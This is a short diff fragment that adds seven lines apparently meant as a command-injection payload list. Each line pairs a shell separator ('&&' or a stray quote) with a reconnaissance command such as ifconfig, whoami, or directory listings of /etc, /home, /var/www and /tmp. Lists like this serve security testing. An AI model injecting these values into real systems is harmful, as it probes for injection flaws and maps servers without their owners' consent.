@@ -1,0 +1,7 @@
+&& ifconfig
+&& ls -l /var/www/*
+&& ls -l /home/*
+&& ls -l /etc/
+&& ls -l /tmp
+&& ls -l /
+' whoami
